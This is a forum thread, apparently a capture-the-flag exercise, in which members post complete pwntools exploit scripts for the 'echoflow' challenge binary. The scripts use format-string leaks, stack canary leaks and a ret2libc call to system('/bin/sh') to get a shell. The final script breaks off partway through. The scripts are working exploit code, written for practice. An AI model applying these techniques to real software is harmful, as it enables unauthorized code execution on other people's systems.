<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>[Pwnable] EchoFlow Me Once Shame On You - Exploit Development - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Hi. 

###Difficulty 
3/10 

###Objective 
Get a shell. 

###Rules 


ASLR on. 


Since no libc is provided, all you have to do is pwn the binary locally. 


GOT overwrite is off the map. Using it for code redirection wil&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="3288.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;[Pwnable] EchoFlow Me Once Shame On You&#39;" href="3288.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/pwnable-echoflow-me-once-shame-on-you/3288" />
<meta name="twitter:url" content="https://0x00sec.org/t/pwnable-echoflow-me-once-shame-on-you/3288" />
<meta property="og:title" content="[Pwnable] EchoFlow Me Once Shame On You" />
<meta name="twitter:title" content="[Pwnable] EchoFlow Me Once Shame On You" />
<meta property="og:description" content="Hi.   ###Difficulty  3/10   ###Objective  Get a shell.   ###Rules    ASLR on.    Since no libc is provided, all you have to do is pwn the binary locally.    GOT overwrite is off the map. Using it for code redirection will lead to disqualification.    Full exploit + demo (i.e asciinema) are accepted as valid solutions. Just a screenshot of the shell doesn’t mean anything.     ###Binary  Pwn me if you can   ~ gl &amp; hf" />
<meta name="twitter:description" content="Hi.   ###Difficulty  3/10   ###Objective  Get a shell.   ###Rules    ASLR on.    Since no libc is provided, all you have to do is pwn the binary locally.    GOT overwrite is off the map. Using it for code redirection will lead to disqualification.    Full exploit + demo (i.e asciinema) are accepted as valid solutions. Just a screenshot of the shell doesn’t mean anything.     ###Binary  Pwn me if you can   ~ gl &amp; hf" />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="linux" />
<meta property="og:article:tag" content="exploitation" />
<meta property="og:article:tag" content="binary" />
<meta property="og:article:tag" content="pwning" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="2 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="18 ❤" />
<meta property="article:published_time" content="2017-08-11T21:23:24+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="3288.html">[Pwnable] EchoFlow Me Once Shame On You</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/exploit-development.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #92278F"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Exploit Development</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/linux.html" class="discourse-tag" rel="tag">linux</a>,
<a href="../../tag/exploitation.html" class="discourse-tag" rel="tag">exploitation</a>,
<a href="../../tag/binary.html" class="discourse-tag" rel="tag">binary</a>,
<a href="../../tag/pwning.html" class="discourse-tag" rel="tag">pwning</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="[Pwnable] EchoFlow Me Once Shame On You">
<meta itemprop="articleSection" content="Exploit Development">
<meta itemprop="keywords" content="linux, exploitation, binary, pwning">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-11T21:23:24Z" class="post-time">
August 11, 2017, 9:23pm
</time>
<meta itemprop="dateModified" content="2017-08-11T21:37:57Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Hi.</p>
<hr>
<p>###<em>Difficulty</em></p>
<p>3/10</p>
<hr>
<p>###<em>Objective</em></p>
<p>Get a shell.</p>
<hr>
<p>###<em>Rules</em></p>
<ul>
<li>
<p>ASLR on.</p>
</li>
<li>
<p>Since no libc is provided, all you have to do is pwn the binary locally.</p>
</li>
<li>
<p>GOT overwrite is <strong><em>off the map</em></strong>. Using it for code redirection will lead to disqualification.</p>
</li>
<li>
<p>Full exploit + demo (i.e asciinema) are accepted as valid solutions. Just a screenshot of the shell doesn’t mean anything.</p>
</li>
</ul>
<hr>
<p>###<em>Binary</em></p>
<p><a href="https://transfer.sh/sGIbl/echoflow" rel="nofollow noopener">Pwn me if you can</a></p>
<hr>
<p>~ gl &amp; hf</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/exploit"><span itemprop="name">exploit</span></a>
(exploit)
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-11T22:09:59Z" class="post-time">
August 11, 2017, 10:09pm
</time>
<meta itemprop="dateModified" content="2017-08-11T22:09:59Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<ul>
<li>Oh yeah, i’ll sure take a small look at the binary today <img src="../../images/emoji/twitter/blush.png%3Fv=9" title=":blush:" class="emoji" alt=":blush:">!</li>
</ul>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Xorus"><span itemprop="name">Xorus</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-11T22:35:19Z" class="post-time">
August 11, 2017, 10:35pm
</time>
<meta itemprop="dateModified" content="2017-08-11T22:35:19Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Virustotal Scan:<a href="https://www.virustotal.com/#/file/c03a2653fcfd25026f26275c606ee32683dd72fa120937d9bf0f6a3e9033996b/detection" rel="nofollow noopener">https://www.virustotal.com/#/file/c03a2653fcfd25026f26275c606ee32683dd72fa120937d9bf0f6a3e9033996b/detection</a></p>
<p>Will try this out in a bit <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/exploit"><span itemprop="name">exploit</span></a>
(exploit)
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T00:26:03Z" class="post-time">
August 12, 2017, 12:26am
</time>
<meta itemprop="dateModified" content="2017-08-12T00:26:03Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Done, good challenge <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"> !</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T02:28:00Z" class="post-time">
August 12, 2017, 2:28am
</time>
<meta itemprop="dateModified" content="2017-08-12T02:33:22Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> Let the rest feel the taste of first blood for once <img src="../../images/emoji/twitter/stuck_out_tongue.png%3Fv=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"> Just kidding, great job man! <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>Any feedback? Was it a bit tougher/trickier than the previous one?</p>
<p>Feel free to share your PoC exploit inside the spoiler tags so those who were stuck can benefit from it. I’ll post mine in a couple of days. I’m curious if you solved it the intended way.</p>
<div class="spoiler">
<p>Did you use read() in order to leak the canary? I hope you didn’t use the GOT overwrite technique. </p>
</div>
<p><a class="mention" href="https://0x00sec.org/u/xorus">@Xorus</a> Even a hello-world program gets picked up by AVs as malicious anymore, just FYI <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Cheers.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Xorus"><span itemprop="name">Xorus</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T03:02:48Z" class="post-time">
August 12, 2017, 3:02am
</time>
<meta itemprop="dateModified" content="2017-08-12T03:02:48Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/_py">@_py</a> Yeah I get that, just usually makes people a lot calmer around files. Especially on security / hacking forums.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/mkhdznfq"><span itemprop="name">mkhdznfq</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/f/ff9bd3d7801153180032feb47051645decfcaec9.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T13:48:30Z" class="post-time">
August 12, 2017, 1:48pm
</time>
<meta itemprop="dateModified" content="2017-08-12T13:48:30Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>thanks <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> for the challenge. here’s my poc</p>
<div class="spoiler">
<pre><code class="lang-python">from pwn import *
context(arch='i386', os='linux')

# use libc-database to find offset
# ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu7_i386)
offset_printf = 0x00049670
offset_system = 0x0003ada0
offset_str_bin_sh = 0x15b9ab

# open the process
r = process("./echoflow")

# leak printf address &amp; canary
r.recvuntil("Enter your input and I'll echo it back!\n")
r.sendline("\x14\xa0\x04\x08%23$s|%39$X|END")
out = r.recvuntil("|END").split("|")
printf_addr = u32(out[0][4:8])
print "printf address = 0x{:x}".format(printf_addr)
canary = int(out[1], 16)
print "canary = 0x{:x}".format(canary)

# calculate system address &amp; sh address
system_addr = printf_addr - offset_printf + offset_system
sh_address = printf_addr - offset_printf + offset_str_bin_sh
print "system address = 0x{:x}".format(system_addr)
print "sh address = 0x{:x}".format(sh_address)

# create &amp; send payload to get shell
payload = flat("a"*128, canary, "a"*12, system_addr, "a"*4, sh_address)
r.recvuntil("Overflow me if you can!\n")
r.sendline(payload)
r.recvline()
r.interactive()
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/ff9bd3d7801153180032feb47051645decfcaec9.png" width="690" height="391"></p>
</div>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T14:16:20Z" class="post-time">
August 12, 2017, 2:16pm
</time>
<meta itemprop="dateModified" content="2017-08-12T14:16:20Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<div class="spoiler">
<p>Damn, I didn’t think of banning capital ‘x’ <img src="../../images/emoji/twitter/confused.png%3Fv=9" title=":confused:" class="emoji" alt=":confused:"> The intended way to leak the canary was via the read() function. Try leaking it via that, it will require a bit of more creativity. Congrats either way! <img src="../../images/emoji/twitter/ok_hand.png%3Fv=9" title=":ok_hand:" class="emoji" alt=":ok_hand:"></p>
</div>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T14:17:38Z" class="post-time">
August 12, 2017, 2:17pm
</time>
<meta itemprop="dateModified" content="2017-08-12T14:17:38Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p><strong><em>NOTE:</em></strong> <em>Don’t use the fsb to leak the canary (though it’s fair game). Be more creative!</em></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/exploit"><span itemprop="name">exploit</span></a>
(exploit)
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T17:36:32Z" class="post-time">
August 12, 2017, 5:36pm
</time>
<meta itemprop="dateModified" content="2017-08-12T18:00:46Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Yoooo, I just came back home! <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:"><br>
About the binary, it was better than the last one, I followed the rules and I ended up solving it the intended way <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:">!<br>
Sorry for the late reply, i’ll share my POC:</p>
<div class="spoiler">
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *

# LOCAL DIFF
sh_diff = 0x15cc28
sys_diff = 0x3a840
exit_diff = 0x8f860

counter_address = 0x0804a03c
c = process("./echoflow")

main = 0x80485dd

# Increase loop-size
# You can either use %u or %i or %X, since alot of format-specifiers are filtred..
format_payload = p32(counter_address) + "%1u%23$hn"

c.sendline(format_payload)

c.recvuntil("Overflow me if you can!")
# Exploiting the Non-NULL-Terminated string for a leak!
payload = "B" * (4*11)
c.sendline(payload)

c.recvuntil(payload)
c.recvline()

canary = u32(c.recv(3).rjust(4, "\x00"))
print "Canary: " + hex(canary)
c.recv()

# Use the format-string bug to leak the content of a GOT entry ( exit_got )
# It contains the address of the exit function in libc..
format_payload = p32(0x0804a028) + "%23$s"
c.sendline(format_payload)

# Saving and calculating part..
c.recvline()
libc_exit = u32(c.recvline()[:-1][8:12])
libc_base = libc_exit - exit_diff
print "libc_base @ " + hex(libc_base)
binsh = libc_base + sh_diff
system = libc_base + sys_diff

c.recvuntil("Overflow me if you can!")
# Leaking the before_canary value; consider it, like two stack canaries..
payload = "A" * 128
c.sendline(payload)

c.recvuntil(payload)
c.recvline()

before_canary = u32(c.recv(3).rjust(4, "\x00"))

# Using the leaked canaries to prevent __stack_chk_fail() from being called
# and using the previous format leak, and it's calculated addresses
# to call system("/bin/sh") and pop a shell!
payload += p32(before_canary)
payload += p32(1)
payload += p32(canary)
payload += p32(0)
payload += p32(system)
payload += "BBBB"
payload += p32(binsh)

c.sendline("JUNK")
c.recvuntil("Overflow me if you can!")
c.sendline(payload)

# Press enter many times to escape the loop..
# BINGO! shell :) ( probably, lol )
c.recv()

c.interactive()

</code></pre>
</div>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/mkhdznfq"><span itemprop="name">mkhdznfq</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T17:42:44Z" class="post-time">
August 12, 2017, 5:42pm
</time>
<meta itemprop="dateModified" content="2017-08-12T17:42:44Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>i thought about leaking canary using the intended method, but since i can use fsb why bother <img src="../../images/emoji/twitter/stuck_out_tongue_winking_eye.png%3Fv=9" title=":stuck_out_tongue_winking_eye:" class="emoji" alt=":stuck_out_tongue_winking_eye:"> anyway here’s another poc</p>
<div class="spoiler">
<pre><code class="lang-python">from pwn import *
context(arch='i386', os='linux')	

# use libc-database to find offset
# ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu7_i386)
offset_printf = 0x00049670
offset_system = 0x0003ada0
offset_str_bin_sh = 0x15b9ab

# open the process
r = process("./echoflow")

# leak printf &amp; create loop
r.recvuntil("Enter your input and I'll echo it back!\n")
r.sendline("\x3c\xa0\x04\x08\x14\xa0\x04\x08%23$hn%24$s")
printf_addr = u32(r.recvline().strip()[8:12])
print "printf address: 0x{:x}".format(printf_addr)

# calculate system address &amp; sh address
system_addr = printf_addr - offset_printf + offset_system
sh_address = printf_addr - offset_printf + offset_str_bin_sh
print "system address = 0x{:x}".format(system_addr)
print "sh address = 0x{:x}".format(sh_address)

# leak canary
r.recvuntil("Overflow me if you can!\n")
r.send("a" * 128 + "|")
canary = u32("\x00" + r.recvline().split("|")[1][:3])
print "canary = 0x{:x}".format(canary)

# create payload
payload = flat("a"*128, canary, "a"*12, system_addr, "a"*4, sh_address)

# run payload
for i in xrange(7):
	r.recvuntil("Enter your input and I'll echo it back!\n")
	r.sendline("JUNK")
	r.recvuntil("Overflow me if you can!\n")
	if i &lt; 6: r.sendline("JUNK")
	else: r.sendline(payload)
r.recvline()
r.interactive()
</code></pre>
</div>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3288.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-12T18:49:38Z" class="post-time">
August 12, 2017, 6:49pm
</time>
<meta itemprop="dateModified" content="2017-08-12T18:55:04Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>There you go! You nailed it folks! <img src="../../images/emoji/twitter/call_me_hand.png%3Fv=9" title=":call_me_hand:" class="emoji" alt=":call_me_hand:"></p>
<p>Here’s my PoC for the sake of exploit variety:</p>
<div class="spoiler">
<pre><code class="lang-python">
from pwn import *

fgets_got = 0x804a018
counter   = 0x804a03c

def echo(payload):

	p.recvuntil('back!\n')
	p.sendline(payload)

	return 

def ovflow(payload):

	p.recvuntil('can!\n')
	p.sendline(payload)

	return

def leak_libc(addr, off):

	p.recvuntil('back!\n')

	payload  = ''
	payload += p32(addr)
	payload += "%{}$s".format(str(off))

	p.sendline(payload)

	leak = u32(p.recvline()[4:8])

	return leak

def leak_canary(payload):

	p.recvuntil('can!\n')

	p.sendline(payload)
	p.recvuntil(payload[-1] + '\n')

	canary = u32(p.recv(3).rjust(4, '\x00'))

	return canary

def overwrite(addr, off, pad = 0):

	p.recvuntil('back!\n')

	if (pad == 0):
		payload  = ''
		payload += p32(addr)
		payload += "%{}$n".format(str(off))

	else:
		payload  = ''
		payload += p32(addr)
		payload += "%{}${}x".format(str(off), str(pad - len(pad)))
